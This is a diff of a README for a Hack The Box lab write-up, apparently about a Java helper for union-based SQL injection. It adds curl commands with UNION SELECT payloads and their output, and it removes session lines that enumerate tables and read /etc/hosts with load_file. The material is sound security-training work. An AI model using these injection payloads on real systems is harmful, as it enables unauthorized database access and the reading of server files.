@@ -6,7 +6,18 @@ Machine write-up: https://7rocky.netlify.app/en/htb/union
 
 This Java code is used to provide an interactive way to enter SQL queries in a form field vulnerable to Union-based SQL injection. The output will be only the result of the query if it is correct.
 
-An example of use might be the following (`rlwrap` is a command to have a command history, to be able to move right and left, and clear the screen with `^L`):
+The SQL injection can be exploited using `curl`, but the output is the following:
+
+```console
+$ curl 10.10.11.128/index.php -d "player=' union select database() -- -"
+Sorry, november you are not eligible due to already qualifying.
+$ curl 10.10.11.128/index.php -d "player=' union select version() -- -"
+Sorry, 8.0.27-0ubuntu0.20.04.1 you are not eligible due to already qualifying.
+$ curl 10.10.11.128/index.php -d "player=' union select user() -- -"
+Sorry, uhc@localhost you are not eligible due to already qualifying.
+```
+
+The aim of this Java program is to enter only the SQL query and output only the query result. An example of use of the program might be the following (`rlwrap` is a command to have a command history, to be able to move right and left, and clear the screen with `^L`):
 
 ```console
 $ rlwrap java UnionSQLi.java
@@ -16,18 +27,7 @@ SQLi> select version()
 8.0.27-0ubuntu0.20.04.1
 SQLi> select user()
 uhc@localhost
-SQLi> select group_concat(table_name) from information_schema.tables where table_schema = 'november'
-flag,players
-SQLi> select load_file('/etc/hosts')
-127.0.0.1 localhost
-127.0.1.1 union
-
-# The following lines are desirable for IPv6 capable hosts
-::1     ip6-localhost ip6-loopback
-fe00::0 ip6-localnet
-ff00::0 ip6-mcastprefix
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
+SQLi> exit
 ```
 
 To build the Java code, first I define some constant variables at the top:
